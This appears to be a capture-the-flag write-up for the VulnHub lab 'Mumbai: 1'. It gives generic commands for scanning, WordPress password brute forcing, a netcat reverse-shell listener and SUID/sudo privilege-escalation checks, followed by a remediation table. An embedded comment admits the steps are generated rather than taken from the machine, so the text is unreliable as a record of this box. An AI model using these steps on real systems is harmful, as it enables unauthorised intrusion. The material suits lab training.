# Mumbai: 1 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Intermediate |
| **OS** | Linux |
| **Root Flag** | /root/root.txt |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/mumbai-1,485/) |

<!-- generated from known techniques; verify against live VM -->

## Attack Summary

`nmap` → web enumeration (gobuster/dirb) → WordPress or PHP CMS → credential discovery → reverse shell → SUID/sudo misconfiguration → root

## Methodology

1. Network discovery
2. Port scan and service enumeration
3. Web application recon (gobuster, nikto)
4. Authentication bypass or credential brute force
5. Reverse shell via web application
6. Privilege escalation via SUID or sudo

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
```

---

## Step 2: Port Scan

```bash
nmap -sV -sC -p- <TARGET_IP>
```

Common open ports: 22 (SSH), 80 (HTTP), possibly 8080.

---

## Step 3: Web Enumeration

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html
nikto -h http://<TARGET_IP>/
```

Look for CMS installations, admin panels, upload endpoints.

---

## Step 4: Application Attack

Identify the CMS or framework. Common paths:
- `/wp-admin`, `/wp-login.php` → WordPress
- `/admin`, `/login.php` → custom PHP
- `/phpmyadmin` → database management

```bash
# For WordPress
wpscan --url http://<TARGET_IP>/ -e u,ap
wpscan --url http://<TARGET_IP>/ -U <user> -P /usr/share/wordlists/rockyou.txt
```

---

## Step 5: Reverse Shell

Upload or inject a PHP reverse shell. Start listener:
```bash
nc -lvnp 4444
```

Trigger via browser or curl. Stabilize:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Step 6: Privilege Escalation

```bash
# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check writable cron scripts
cat /etc/crontab
ls -la /etc/cron*
```

Escalate based on findings (sudo misconfiguration, SUID binary, writable cron).

```bash
id
cat /root/root.txt
```

---

## Lessons Learned

1. **Web application enumeration** is fundamental — hidden endpoints often lead to compromise
2. **Default or weak credentials** on CMS installations remain prevalent
3. **SUID/sudo misconfigurations** are common escalation paths in CTF machines

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| Weak CMS credentials | Enforce strong passwords; disable default accounts |
| Unnecessary SUID binaries | Audit with `find / -perm -u=s`; remove SUID where not needed |
| Writable cron scripts | Restrict permissions to root-only write |
